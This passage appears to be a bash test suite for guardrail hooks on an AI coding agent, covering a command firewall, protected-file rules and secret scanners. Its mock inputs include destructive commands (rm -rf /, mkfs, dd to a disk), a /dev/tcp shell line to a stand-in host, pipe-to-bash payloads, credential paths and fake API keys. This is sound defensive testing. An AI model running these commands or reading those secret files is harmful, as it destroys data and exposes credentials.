#!/usr/bin/env bash
set -euo pipefail

# ============================================================
# Hook-Tests
# Tests all hooks with mock JSON input
# ============================================================

SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
HOOKS_DIR="$SCRIPT_DIR/hooks"
PASS=0
FAIL=0

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

assert_exit() {
  local desc="$1"
  local expected_exit="$2"
  local script="$3"
  local input="$4"

  local actual_exit=0
  echo "$input" | bash "$script" >/dev/null 2>/dev/null || actual_exit=$?

  if [[ "$actual_exit" -eq "$expected_exit" ]]; then
    printf '  %b[PASS]%b %s\n' "$GREEN" "$NC" "$desc"
    PASS=$((PASS + 1))
  else
    printf '  %b[FAIL]%b %s (expected: %s, got: %s)\n' "$RED" "$NC" "$desc" "$expected_exit" "$actual_exit"
    FAIL=$((FAIL + 1))
  fi
}

echo "=== Hook-Tests ==="
echo ""

# --- bash-firewall.sh ---
echo "-- bash-firewall.sh: Basic deny patterns --"
FW="$HOOKS_DIR/bash-firewall.sh"

# Blocked commands (Exit 0 + JSON deny — block() uses exit 0 so JSON is processed)
assert_exit "Blocks rm -rf /" 0 "$FW" '{"tool_input":{"command":"rm -rf /"}}'
assert_exit "Blocks rm -rf ~" 0 "$FW" '{"tool_input":{"command":"rm -rf ~"}}'
assert_exit "Blocks rm -rf ./" 0 "$FW" '{"tool_input":{"command":"rm -rf ./"}}'
assert_exit "Blocks git push main" 0 "$FW" '{"tool_input":{"command":"git push origin main"}}'
assert_exit "Blocks git push master" 0 "$FW" '{"tool_input":{"command":"git push origin master"}}'
assert_exit "Blocks git reset --hard" 0 "$FW" '{"tool_input":{"command":"git reset --hard HEAD~1"}}'
assert_exit "Blocks git commit --amend" 0 "$FW" '{"tool_input":{"command":"git commit --amend -m fix"}}'
assert_exit "Blocks > /etc/" 0 "$FW" '{"tool_input":{"command":"echo test > /etc/hosts"}}'
assert_exit "Blocks chmod 777" 0 "$FW" '{"tool_input":{"command":"chmod 777 file.sh"}}'
assert_exit "Blocks eval" 0 "$FW" '{"tool_input":{"command":"eval \"rm -rf /\""}}'
assert_exit "Blocks source /dev/" 0 "$FW" '{"tool_input":{"command":"source /dev/tcp/evil/80"}}'
assert_exit "Blocks nano" 0 "$FW" '{"tool_input":{"command":"nano file.txt"}}'
assert_exit "Blocks vi" 0 "$FW" '{"tool_input":{"command":"vi file.txt"}}'
assert_exit "Blocks vim" 0 "$FW" '{"tool_input":{"command":"vim file.txt"}}'
assert_exit "Blocks emacs" 0 "$FW" '{"tool_input":{"command":"emacs file.txt"}}'
assert_exit "Blocks pip --break" 0 "$FW" '{"tool_input":{"command":"pip install --break-system-packages foo"}}'
assert_exit "Blocks mkfs" 0 "$FW" '{"tool_input":{"command":"mkfs.ext4 /dev/sda1"}}'
assert_exit "Blocks dd of=/dev/" 0 "$FW" '{"tool_input":{"command":"dd if=/dev/zero of=/dev/sda"}}'

# Allowed commands (Exit 0)
assert_exit "Allows ls -la" 0 "$FW" '{"tool_input":{"command":"ls -la"}}'
assert_exit "Allows git push feature" 0 "$FW" '{"tool_input":{"command":"git push origin feature/my-feature"}}'
assert_exit "Allows git commit" 0 "$FW" '{"tool_input":{"command":"git commit -m \"feat: test\""}}'
assert_exit "Allows npm test" 0 "$FW" '{"tool_input":{"command":"npm test"}}'
assert_exit "Allows chmod 755" 0 "$FW" '{"tool_input":{"command":"chmod 755 script.sh"}}'

echo ""

# --- bash-firewall.sh: Bypass protection ---
echo "-- bash-firewall.sh: Bypass protection --"
assert_exit "Blocks bash -c" 0 "$FW" '{"tool_input":{"command":"bash -c \"rm -rf /\""}}'
assert_exit "Blocks sh -c" 0 "$FW" '{"tool_input":{"command":"sh -c \"echo pwned\""}}'
assert_exit "Allows bash script.sh" 0 "$FW" '{"tool_input":{"command":"bash script.sh"}}'

# Bypass variants (from Codex + review findings)
assert_exit "Blocks rm -r -f /" 0 "$FW" '{"tool_input":{"command":"rm -r -f /"}}'
assert_exit "Blocks /bin/rm -rf /" 0 "$FW" '{"tool_input":{"command":"/bin/rm -rf /"}}'
assert_exit "Blocks /usr/bin/rm -rf /" 0 "$FW" '{"tool_input":{"command":"/usr/bin/rm -rf /"}}'
assert_exit "Blocks command rm -rf /" 0 "$FW" '{"tool_input":{"command":"command rm -rf /"}}'
assert_exit "Blocks env rm -rf /" 0 "$FW" '{"tool_input":{"command":"env rm -rf /"}}'
assert_exit "Blocks git push -f main" 0 "$FW" '{"tool_input":{"command":"git push -f origin main"}}'
assert_exit "Blocks git push --force main" 0 "$FW" '{"tool_input":{"command":"git push --force origin main"}}'
assert_exit "Blocks git push -f feature" 0 "$FW" '{"tool_input":{"command":"git push -f origin feature/my-feature"}}'
assert_exit "Blocks git push --force feature" 0 "$FW" '{"tool_input":{"command":"git push --force origin feature/my-feature"}}'
assert_exit "Blocks --force-with-lease main" 0 "$FW" '{"tool_input":{"command":"git push --force-with-lease origin main"}}'
assert_exit "Blocks --force-with-lease feature" 0 "$FW" '{"tool_input":{"command":"git push --force-with-lease origin feature/x"}}'
assert_exit "Blocks git push HEAD:main" 0 "$FW" '{"tool_input":{"command":"git push origin HEAD:main"}}'
assert_exit "Blocks env bash -c" 0 "$FW" '{"tool_input":{"command":"env bash -c evil"}}'
assert_exit "Blocks command eval" 0 "$FW" '{"tool_input":{"command":"command eval \"bad()\""}}'
assert_exit "Blocks exec rm -rf /" 0 "$FW" '{"tool_input":{"command":"exec rm -rf /"}}'

echo ""

# --- bash-firewall.sh: Interpreter injection ---
echo "-- bash-firewall.sh: Interpreter injection --"
assert_exit "Blocks python -c" 0 "$FW" '{"tool_input":{"command":"python -c \"import os; os.system(\\\"rm -rf /\\\")\""}}'
assert_exit "Blocks python3 -c" 0 "$FW" '{"tool_input":{"command":"python3 -c \"import shutil; shutil.rmtree(\\\".\\\")\""}}'
assert_exit "Blocks node -e" 0 "$FW" '{"tool_input":{"command":"node -e \"require(\\\"child_process\\\").exec(\\\"evil\\\")\""}}'
assert_exit "Blocks perl -e" 0 "$FW" '{"tool_input":{"command":"perl -e \"system(\\\"rm -rf /\\\")\""}}'
assert_exit "Blocks ruby -e" 0 "$FW" '{"tool_input":{"command":"ruby -e \"system(\\\"rm -rf /\\\")\""}}'
assert_exit "Allows python script.py" 0 "$FW" '{"tool_input":{"command":"python script.py"}}'
assert_exit "Allows node app.js" 0 "$FW" '{"tool_input":{"command":"node app.js"}}'

echo ""

# --- bash-firewall.sh: Subshell/pipe protection ---
echo "-- bash-firewall.sh: Subshell/pipe protection --"
assert_exit "Blocks cmd subst rm -rf" 0 "$FW" '{"tool_input":{"command":"echo $(rm -rf /)"}}'
assert_exit "Blocks cmd subst eval" 0 "$FW" '{"tool_input":{"command":"x=$(eval bad)"}}'
assert_exit "Blocks pipe to sh" 0 "$FW" '{"tool_input":{"command":"cat payload.sh | sh"}}'
assert_exit "Blocks pipe to bash" 0 "$FW" '{"tool_input":{"command":"cat payload.sh | bash"}}'
assert_exit "Blocks proc subst rm -rf" 0 "$FW" '{"tool_input":{"command":"diff <(rm -rf /) <(cat safe)"}}'
assert_exit "Blocks proc subst eval" 0 "$FW" '{"tool_input":{"command":"cat <(eval bad)"}}'
assert_exit "Blocks backtick rm -rf" 0 "$FW" '{"tool_input":{"command":"x=`rm -rf /`"}}'
assert_exit "Blocks backtick eval" 0 "$FW" '{"tool_input":{"command":"x=`eval bad`"}}'
assert_exit "Blocks pipe to /bin/bash" 0 "$FW" '{"tool_input":{"command":"cat payload.sh | /bin/bash"}}'
assert_exit "Blocks herestring to bash" 0 "$FW" '{"tool_input":{"command":"bash <<< \"rm -rf /\""}}'
assert_exit "Allows safe cmd subst" 0 "$FW" '{"tool_input":{"command":"VERSION=$(cat VERSION)"}}'
assert_exit "Allows safe backtick" 0 "$FW" '{"tool_input":{"command":"VERSION=`cat VERSION`"}}'
assert_exit "Allows safe pipe to grep" 0 "$FW" '{"tool_input":{"command":"echo hello | grep x"}}'
assert_exit "Allows safe proc subst" 0 "$FW" '{"tool_input":{"command":"diff <(cat a.txt) <(cat b.txt)"}}'

echo ""

# --- protect-files.sh ---
echo "-- protect-files.sh: Basic protection --"
PF="$HOOKS_DIR/protect-files.sh"

# Blocked files (Exit 0 + JSON deny — block() uses exit 0 so JSON is processed)
assert_exit "Blocks .env" 0 "$PF" '{"tool_input":{"file_path":"/home/c/.env"}}'
assert_exit "Blocks .env.local" 0 "$PF" '{"tool_input":{"file_path":"/home/c/.env.local"}}'
assert_exit "Blocks secrets/" 0 "$PF" '{"tool_input":{"file_path":"/home/c/secrets/api.json"}}'
assert_exit "Blocks .ssh/" 0 "$PF" '{"tool_input":{"file_path":"/home/c/.ssh/id_rsa"}}'
assert_exit "Blocks .aws/" 0 "$PF" '{"tool_input":{"file_path":"/home/c/.aws/credentials"}}'
assert_exit "Blocks *.pem" 0 "$PF" '{"tool_input":{"file_path":"/home/c/cert.pem"}}'
assert_exit "Blocks *.key" 0 "$PF" '{"tool_input":{"file_path":"/home/c/private.key"}}'
assert_exit "Blocks .git/" 0 "$PF" '{"tool_input":{"file_path":"/home/c/repo/.git/config"}}'
assert_exit "Blocks .npmrc" 0 "$PF" '{"tool_input":{"file_path":"/home/c/.npmrc"}}'
assert_exit "Blocks .netrc" 0 "$PF" '{"tool_input":{"file_path":"/home/c/.netrc"}}'

# package-lock.json (Write/Edit blocked, Read allowed)
assert_exit "Blocks package-lock.json Write" 0 "$PF" '{"tool_name":"Write","tool_input":{"file_path":"/home/c/project/package-lock.json"}}'
assert_exit "Blocks package-lock.json Edit" 0 "$PF" '{"tool_name":"Edit","tool_input":{"file_path":"/home/c/project/package-lock.json"}}'
assert_exit "Allows package-lock.json Read" 0 "$PF" '{"tool_name":"Read","tool_input":{"file_path":"/home/c/project/package-lock.json"}}'

# Allowed files (Exit 0)
assert_exit "Allows src/index.ts" 0 "$PF" '{"tool_input":{"file_path":"/home/c/src/index.ts"}}'
assert_exit "Allows README.md" 0 "$PF" '{"tool_input":{"file_path":"/home/c/README.md"}}'
assert_exit "Allows empty path" 0 "$PF" '{"tool_input":{}}'

echo ""

# --- protect-files.sh: Glob/Grep path protection ---
echo "-- protect-files.sh: Glob/Grep path --"
assert_exit "Blocks Glob on .ssh/" 0 "$PF" '{"tool_name":"Glob","tool_input":{"path":"/home/c/.ssh/","pattern":"**/*"}}'
assert_exit "Blocks Grep on .aws/" 0 "$PF" '{"tool_name":"Grep","tool_input":{"path":"/home/c/.aws/","pattern":"key"}}'
assert_exit "Blocks Glob on .env" 0 "$PF" '{"tool_name":"Glob","tool_input":{"path":"/home/c/.env"}}'
assert_exit "Allows Glob on src/" 0 "$PF" '{"tool_name":"Glob","tool_input":{"path":"/home/c/src/","pattern":"**/*.ts"}}'
assert_exit "Allows Grep on project/" 0 "$PF" '{"tool_name":"Grep","tool_input":{"path":"/home/c/project/","pattern":"TODO"}}'

echo ""

# --- protect-files.sh: Case-insensitive matching ---
echo "-- protect-files.sh: Case-insensitive --"
assert_exit "Blocks .ENV (uppercase)" 0 "$PF" '{"tool_input":{"file_path":"/home/c/.ENV"}}'
assert_exit "Blocks .Env.Local (mixed)" 0 "$PF" '{"tool_input":{"file_path":"/home/c/.Env.Local"}}'
assert_exit "Blocks .SSH/ (uppercase)" 0 "$PF" '{"tool_input":{"file_path":"/home/c/.SSH/id_rsa"}}'
assert_exit "Blocks cert.PEM (ext)" 0 "$PF" '{"tool_input":{"file_path":"/home/c/cert.PEM"}}'
assert_exit "Blocks private.KEY (ext)" 0 "$PF" '{"tool_input":{"file_path":"/home/c/private.KEY"}}'

echo ""

# --- protect-files.sh: Allowlist ---
echo "-- protect-files.sh: Allowlist --"
assert_exit "Allows .env.example" 0 "$PF" '{"tool_input":{"file_path":"/home/c/project/.env.example"}}'
assert_exit "Allows .env.sample" 0 "$PF" '{"tool_input":{"file_path":"/home/c/project/.env.sample"}}'
assert_exit "Allows .env.template" 0 "$PF" '{"tool_input":{"file_path":"/home/c/project/.env.template"}}'
assert_exit "Blocks .env.local still" 0 "$PF" '{"tool_input":{"file_path":"/home/c/.env.local"}}'

echo ""

# --- protect-files.sh: Hook-Tampering ---
echo "-- protect-files.sh: Hook-Tampering --"
assert_exit "Blocks hooks.json Write" 0 "$PF" '{"tool_name":"Write","tool_input":{"file_path":"/home/c/.claude/hooks.json"}}'
assert_exit "Blocks hooks.json Edit" 0 "$PF" '{"tool_name":"Edit","tool_input":{"file_path":"/home/c/.claude/hooks.json"}}'
assert_exit "Blocks hooks/ Write" 0 "$PF" '{"tool_name":"Write","tool_input":{"file_path":"/home/c/.claude/hooks/evil.sh"}}'
assert_exit "Blocks settings.json Write" 0 "$PF" '{"tool_name":"Write","tool_input":{"file_path":"/home/c/.claude/settings.json"}}'
assert_exit "Blocks settings.local.json Write" 0 "$PF" '{"tool_name":"Write","tool_input":{"file_path":"/home/c/.claude/settings.local.json"}}'
assert_exit "Allows hooks.json Read" 0 "$PF" '{"tool_name":"Read","tool_input":{"file_path":"/home/c/.claude/hooks.json"}}'

echo ""

# --- auto-format.sh ---
echo "-- auto-format.sh --"
AF="$HOOKS_DIR/auto-format.sh"

# Must never block (always Exit 0)
assert_exit "Exit 0 for missing file" 0 "$AF" '{"tool_input":{"file_path":"/nonexistent/file.ts"}}'
assert_exit "Exit 0 for empty path" 0 "$AF" '{"tool_input":{}}'

echo ""

# --- secret-scan.sh ---
echo "-- secret-scan.sh --"
SS="$HOOKS_DIR/secret-scan.sh"

# Must never block (always Exit 0)
assert_exit "Exit 0 for missing file" 0 "$SS" '{"tool_input":{"file_path":"/nonexistent/file.ts"}}'
assert_exit "Exit 0 for empty path" 0 "$SS" '{"tool_input":{}}'

# Secret detection (needs real temp files)
TMPDIR_TEST="${TMPDIR:-/tmp/claude}/test-hooks-$$"
mkdir -p "$TMPDIR_TEST"
trap 'rm -rf "$TMPDIR_TEST"' EXIT

# Clean file — no warning
echo "const x = 42;" >"$TMPDIR_TEST/clean.js"
CLEAN_OUT=$(echo "{\"tool_input\":{\"file_path\":\"$TMPDIR_TEST/clean.js\"}}" | bash "$SS" 2>/dev/null)
if [[ -z "$CLEAN_OUT" ]]; then
  printf '  %b[PASS]%b No alarm on clean file\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b False alarm on clean file: %s\n' "$RED" "$NC" "$CLEAN_OUT"
  FAIL=$((FAIL + 1))
fi

# File with fake AWS key — should warn
echo "AWS_KEY=AKIAIOSFODNN7EXAMPLE" >"$TMPDIR_TEST/secrets.txt" # pragma: allowlist secret
SECRET_OUT=$(echo "{\"tool_input\":{\"file_path\":\"$TMPDIR_TEST/secrets.txt\"}}" | bash "$SS" 2>/dev/null)
if [[ "$SECRET_OUT" == *"AWS Access Key"* ]]; then
  printf '  %b[PASS]%b Detects AWS Key\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b AWS Key not detected: %s\n' "$RED" "$NC" "$SECRET_OUT"
  FAIL=$((FAIL + 1))
fi

# File with fake private key — should warn
echo "-----BEGIN PRIVATE KEY-----" >"$TMPDIR_TEST/key.pem"
PRIVKEY_OUT=$(echo "{\"tool_input\":{\"file_path\":\"$TMPDIR_TEST/key.pem\"}}" | bash "$SS" 2>/dev/null)
if [[ "$PRIVKEY_OUT" == *"Private Key"* ]]; then
  printf '  %b[PASS]%b Detects Private Key\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b Private Key not detected: %s\n' "$RED" "$NC" "$PRIVKEY_OUT"
  FAIL=$((FAIL + 1))
fi

# File with Stripe key — should warn (new pattern)
echo "STRIPE_KEY=sk_live_abcdefghijklmnopqrstuvwx" >"$TMPDIR_TEST/stripe.txt"
STRIPE_OUT=$(echo "{\"tool_input\":{\"file_path\":\"$TMPDIR_TEST/stripe.txt\"}}" | bash "$SS" 2>/dev/null)
if [[ "$STRIPE_OUT" == *"Stripe"* ]]; then
  printf '  %b[PASS]%b Detects Stripe Key\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b Stripe Key not detected: %s\n' "$RED" "$NC" "$STRIPE_OUT"
  FAIL=$((FAIL + 1))
fi

# File with Slack token — should warn (new pattern)
echo "SLACK_TOKEN=xoxb-1234567890-abcdefghij" >"$TMPDIR_TEST/slack.txt"
SLACK_OUT=$(echo "{\"tool_input\":{\"file_path\":\"$TMPDIR_TEST/slack.txt\"}}" | bash "$SS" 2>/dev/null)
if [[ "$SLACK_OUT" == *"Slack"* ]]; then
  printf '  %b[PASS]%b Detects Slack Token\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b Slack Token not detected: %s\n' "$RED" "$NC" "$SLACK_OUT"
  FAIL=$((FAIL + 1))
fi

echo ""

# --- session-logger.sh ---
echo "-- session-logger.sh --"
SL="$HOOKS_DIR/session-logger.sh"

# Must always exit 0
assert_exit "Exit 0 (must never block)" 0 "$SL" '{}'

# Log file is written
TEST_LOG="$TMPDIR_TEST/session-log.txt"
BEFORE_COUNT=0
[[ -f "$TEST_LOG" ]] && BEFORE_COUNT=$(wc -l <"$TEST_LOG")
echo '{}' | CLAUDE_LOG_DIR="$TMPDIR_TEST" bash "$SL" >/dev/null 2>/dev/null || true
AFTER_COUNT=0
[[ -f "$TEST_LOG" ]] && AFTER_COUNT=$(wc -l <"$TEST_LOG")
if [[ "$AFTER_COUNT" -gt "$BEFORE_COUNT" ]]; then
  printf '  %b[PASS]%b Writes to session-log.txt\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b session-log.txt not written\n' "$RED" "$NC"
  FAIL=$((FAIL + 1))
fi

echo ""

# --- session-logger.sh: Log rotation ---
echo "-- session-logger.sh: Log rotation --"
ROTATION_LOG="$TMPDIR_TEST/session-log.txt"
# Create log with 1050 lines (exceeds MAX_LOG_LINES=1000)
for i in $(seq 1 1050); do
  printf '%s | line %d\n' "2025-01-01T00:00:00" "$i"
done >"$ROTATION_LOG"
CLAUDE_LOG_DIR="$TMPDIR_TEST" bash "$SL" >/dev/null 2>/dev/null || true
ROTATED_COUNT=$(wc -l <"$ROTATION_LOG" 2>/dev/null || printf '0')
if [[ "$ROTATED_COUNT" -le 1001 ]]; then
  printf '  %b[PASS]%b Log rotation works (%d lines)\n' "$GREEN" "$NC" "$ROTATED_COUNT"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b Log not rotated (%d lines, expected <= 1001)\n' "$RED" "$NC" "$ROTATED_COUNT"
  FAIL=$((FAIL + 1))
fi

echo ""

# --- protect-files.sh: Non-ASCII paths ---
echo "-- protect-files.sh: Non-ASCII paths --"
assert_exit "Blocks .env with umlaut path" 0 "$PF" '{"tool_input":{"file_path":"/home/user/Pr\u00f6jekt/.env"}}'
assert_exit "Allows safe umlaut path" 0 "$PF" '{"tool_input":{"file_path":"/home/user/Pr\u00f6jekt/index.ts"}}'

echo ""

# --- secret-scan-pre.sh ---
echo "-- secret-scan-pre.sh --"
SP="$HOOKS_DIR/secret-scan-pre.sh"

# Non-Write/Edit tools → exit 0
assert_exit "Exit 0 for Read" 0 "$SP" '{"tool_name":"Read","tool_input":{"file_path":"/tmp/test"}}'
assert_exit "Exit 0 for Bash" 0 "$SP" '{"tool_name":"Bash","tool_input":{"command":"ls"}}'

# Clean content → exit 0
assert_exit "Clean Write content" 0 "$SP" '{"tool_name":"Write","tool_input":{"file_path":"/tmp/t","content":"const x = 42;"}}'
assert_exit "Clean Edit content" 0 "$SP" '{"tool_name":"Edit","tool_input":{"file_path":"/tmp/t","new_string":"const y = 99;"}}'

# Secrets → exit 0 + JSON deny (block() uses exit 0 so JSON is processed)
assert_exit "Blocks Anthropic Key Write" 0 "$SP" '{"tool_name":"Write","tool_input":{"file_path":"/tmp/t","content":"key=sk-ant-abcdefghij1234567890ab"}}' # pragma: allowlist secret
assert_exit "Blocks AWS Key Edit" 0 "$SP" '{"tool_name":"Edit","tool_input":{"file_path":"/tmp/t","new_string":"AKIAIOSFODNN7EXAMPLE1"}}'                  # pragma: allowlist secret
assert_exit "Blocks Private Key Write" 0 "$SP" '{"tool_name":"Write","tool_input":{"file_path":"/tmp/t","content":"-----BEGIN PRIVATE KEY-----"}}'
assert_exit "Blocks GitHub Token Write" 0 "$SP" '{"tool_name":"Write","tool_input":{"file_path":"/tmp/t","content":"token=ghp_abcdefghijklmnopqrstuvwxyz1234567890"}}' # pragma: allowlist secret

# New patterns: Stripe, Slack
assert_exit "Blocks Stripe Key Write" 0 "$SP" '{"tool_name":"Write","tool_input":{"file_path":"/tmp/t","content":"sk_live_abcdefghijklmnopqrstuvwx"}}' # pragma: allowlist secret
assert_exit "Blocks Slack Token Write" 0 "$SP" '{"tool_name":"Write","tool_input":{"file_path":"/tmp/t","content":"xoxb-1234567890-abcdefghij"}}'      # pragma: allowlist secret

echo ""

# --- secret-scan-pre.sh: Line-level pragma ---
echo "-- secret-scan-pre.sh: Pragma scope --"

# Pragma on same line → allows that line
assert_exit "Pragma allowlist allows same line" 0 "$SP" '{"tool_name":"Write","tool_input":{"file_path":"/tmp/t","content":"sk-ant-abcdefghij1234567890ab # pragma: allowlist secret"}}' # pragma: allowlist secret

# Pragma on different line → blocks the secret line (C2 fix)
assert_exit "Pragma on other line does not protect secret" 0 "$SP" '{"tool_name":"Write","tool_input":{"file_path":"/tmp/t","content":"sk-ant-abcdefghij1234567890ab\n# pragma: allowlist secret"}}' # pragma: allowlist secret

# Multiple lines: one with pragma, one without
assert_exit "Blocks secret on non-pragma line" 0 "$SP" '{"tool_name":"Write","tool_input":{"file_path":"/tmp/t","content":"safe line # pragma: allowlist secret\nkey=sk-ant-abcdefghij1234567890ab"}}' # pragma: allowlist secret

echo ""

# Use writable HOME for hooks that log under ~/.claude in this sandbox.
ORIG_HOME="${HOME:-}"
TEST_HOME="$TMPDIR_TEST/home"
mkdir -p "$TEST_HOME/.claude"
export HOME="$TEST_HOME"

# --- session-start.sh ---
echo "-- session-start.sh --"
SESS="$HOOKS_DIR/session-start.sh"

# Valid SessionStart payload
assert_exit "Exit 0 for SessionStart input" 0 "$SESS" '{"session_id":"sess_123","source":"cli","model":"claude-3-5-sonnet"}'

# Output should contain context payload
SESS_OUT=$(echo '{"session_id":"sess_123","source":"cli","model":"claude-3-5-sonnet"}' | bash "$SESS" 2>/dev/null || true)
if [[ "$SESS_OUT" == *"additionalContext"* || "$SESS_OUT" == *"systemMessage"* ]]; then
  printf '  %b[PASS]%b Returns additional context output\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b Missing additional context/system message: %s\n' "$RED" "$NC" "$SESS_OUT"
  FAIL=$((FAIL + 1))
fi

echo ""

# --- setup.sh ---
echo "-- setup.sh --"
SETUP="$HOOKS_DIR/setup.sh"

# Valid Setup payload
assert_exit "Exit 0 for Setup input" 0 "$SETUP" '{}'

# Output should contain additionalContext
SETUP_OUT=$(echo '{}' | bash "$SETUP" 2>/dev/null || true)
if [[ "$SETUP_OUT" == *"additionalContext"* ]]; then
  printf '  %b[PASS]%b additionalContext in setup output\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b additionalContext missing in setup output: %s\n' "$RED" "$NC" "$SETUP_OUT"
  FAIL=$((FAIL + 1))
fi

# forgeVersion should be in output
if [[ "$SETUP_OUT" == *"forgeVersion"* ]]; then
  printf '  %b[PASS]%b forgeVersion in setup output\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b forgeVersion missing in setup output: %s\n' "$RED" "$NC" "$SETUP_OUT"
  FAIL=$((FAIL + 1))
fi

echo ""

# --- post-failure.sh ---
echo "-- post-failure.sh --"
PFAIL="$HOOKS_DIR/post-failure.sh"

# Valid PostToolUseFailure payload
assert_exit "Exit 0 for PostToolUseFailure input" 0 "$PFAIL" '{"tool_name":"Read","tool_input":{"file_path":"/tmp/x"},"error":"permission denied","is_interrupt":false}'

# Missing error field should be handled gracefully
assert_exit "Exit 0 when error field is missing" 0 "$PFAIL" '{"tool_name":"Read","tool_input":{"file_path":"/tmp/x"},"is_interrupt":false}'

echo ""

# --- Negative/Error scenarios ---
echo "-- Negative/Error scenarios --"

# 1) Corrupt JSON input (all should gracefully exit 0)
assert_exit "FW: Exit 0 on corrupt JSON" 0 "$FW" '{not-json'
assert_exit "PF: Exit 0 on corrupt JSON" 0 "$PF" '{not-json'
assert_exit "SP: Exit 0 on corrupt JSON" 0 "$SP" '{not-json'
assert_exit "AF: Exit 0 on corrupt JSON" 0 "$AF" '{not-json'
assert_exit "SESS: Exit 0 on corrupt JSON" 0 "$SESS" '{not-json'
assert_exit "SETUP: Exit 0 on corrupt JSON" 0 "$SETUP" '{not-json'
assert_exit "PFAIL: Exit 0 on corrupt JSON" 0 "$PFAIL" '{not-json'

# 2) Empty stdin (all should gracefully exit 0)
assert_exit "FW: Exit 0 on empty stdin" 0 "$FW" ''
assert_exit "PF: Exit 0 on empty stdin" 0 "$PF" ''
assert_exit "SP: Exit 0 on empty stdin" 0 "$SP" ''
assert_exit "AF: Exit 0 on empty stdin" 0 "$AF" ''
assert_exit "SESS: Exit 0 on empty stdin" 0 "$SESS" ''
assert_exit "SETUP: Exit 0 on empty stdin" 0 "$SETUP" ''
assert_exit "PFAIL: Exit 0 on empty stdin" 0 "$PFAIL" ''

# 3) Missing tool_input field (all should gracefully exit 0)
assert_exit "FW: Exit 0 without tool_input" 0 "$FW" '{"tool_name":"Bash"}'
assert_exit "PF: Exit 0 without tool_input" 0 "$PF" '{"tool_name":"Write"}'
assert_exit "SP: Exit 0 without tool_input" 0 "$SP" '{"tool_name":"Write"}'
assert_exit "AF: Exit 0 without tool_input" 0 "$AF" '{"tool_name":"Write"}'
assert_exit "SESS: Exit 0 without tool_input" 0 "$SESS" '{"session_id":"sess_123"}'
assert_exit "SETUP: Exit 0 with minimal input" 0 "$SETUP" '{}'
assert_exit "PFAIL: Exit 0 without tool_input" 0 "$PFAIL" '{"tool_name":"Read","error":"denied"}'

# 4) Oversized input to secret-scan-pre.sh (>1MB should be handled gracefully)
SP_BIG_CONTENT="$(head -c 1048577 </dev/zero | tr '\0' 'A')"
SP_OVERSIZED_INPUT="{\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"/tmp/huge.txt\",\"content\":\"$SP_BIG_CONTENT\"}}"
assert_exit "SP: Exit 0 on oversized input (>1MB)" 0 "$SP" "$SP_OVERSIZED_INPUT"
unset SP_BIG_CONTENT SP_OVERSIZED_INPUT

echo ""

# --- pre-compact.sh ---
echo "-- pre-compact.sh --"
PC="$HOOKS_DIR/pre-compact.sh"

# Manual and auto triggers should both pass
assert_exit "Exit 0 for manual trigger" 0 "$PC" '{"trigger":"manual"}'
assert_exit "Exit 0 for auto trigger" 0 "$PC" '{"trigger":"auto"}'

echo ""

# --- task-gate.sh ---
echo "-- task-gate.sh --"
TG="$HOOKS_DIR/task-gate.sh"

# Opt-in gate: disabled by default
assert_exit "Exit 0 when task gate is not set" 0 "$TG" '{"task_id":"t1","task_subject":"done","task_description":"desc"}'

# Enabled gate should enforce checks (invalid forge dir -> blocked)
export CLAUDE_FORGE_TASK_GATE=1
export CLAUDE_FORGE_DIR="$TMPDIR_TEST/does-not-exist"
assert_exit "Exit 2 when task gate enabled with missing forge dir" 2 "$TG" '{"task_id":"t1","task_subject":"done","task_description":"desc"}'
unset CLAUDE_FORGE_TASK_GATE
unset CLAUDE_FORGE_DIR

echo ""

# --- teammate-gate.sh ---
echo "-- teammate-gate.sh --"
TMG="$HOOKS_DIR/teammate-gate.sh"

# Opt-in gate: disabled by default
assert_exit "Exit 0 when teammate gate is not set" 0 "$TMG" '{"teammate_name":"alice","team_name":"core"}'

# Enabled gate in non-git dir should pass
export CLAUDE_FORGE_TEAMMATE_GATE=1
(
  cd "$TMPDIR_TEST" || exit 1
  assert_exit "Exit 0 when teammate gate enabled outside git repo" 0 "$TMG" '{"teammate_name":"alice","team_name":"core"}'
)
unset CLAUDE_FORGE_TEAMMATE_GATE

echo ""

# --- subagent-start.sh ---
echo "-- subagent-start.sh --"
SAS="$HOOKS_DIR/subagent-start.sh"

assert_exit "Exit 0 with valid subagent start input" 0 "$SAS" \
  '{"session_id":"s1","agent_id":"a1","agent_type":"Explore"}'

assert_exit "Exit 0 with empty input" 0 "$SAS" '{}'

echo ""

# --- subagent-stop.sh ---
echo "-- subagent-stop.sh --"
SASP="$HOOKS_DIR/subagent-stop.sh"

assert_exit "Exit 0 with valid subagent stop input" 0 "$SASP" \
  '{"session_id":"s1","agent_id":"a1","agent_type":"Explore","stop_hook_active":false}'

assert_exit "Exit 0 with stop_hook_active true" 0 "$SASP" \
  '{"session_id":"s1","agent_id":"a1","agent_type":"Plan","stop_hook_active":true}'

echo ""

# --- stop.sh ---
echo "-- stop.sh --"
STOPH="$HOOKS_DIR/stop.sh"

assert_exit "Exit 0 on normal stop" 0 "$STOPH" \
  '{"stop_hook_active":false}'

assert_exit "Exit 0 when stop_hook_active true (skip loop)" 0 "$STOPH" \
  '{"stop_hook_active":true}'

echo ""

# --- bash-firewall.sh: Dry-run mode ---
echo "-- bash-firewall.sh: Dry-run mode --"

# Dry-run only applies to LOCAL patterns, not built-in ones.
# Set up local patterns with docker rule, then test dry-run on it.
ORIG_HOME="$HOME"
DRY_HOME="$TMPDIR_TEST/home-dryrun"
mkdir -p "$DRY_HOME/.claude"
printf "LOCAL_DENY_PATTERNS=('docker\\\\s+run')\nLOCAL_DENY_REASONS=(\"Docker run blocked by local policy\")\n" \
  >"$DRY_HOME/.claude/local-patterns.sh"

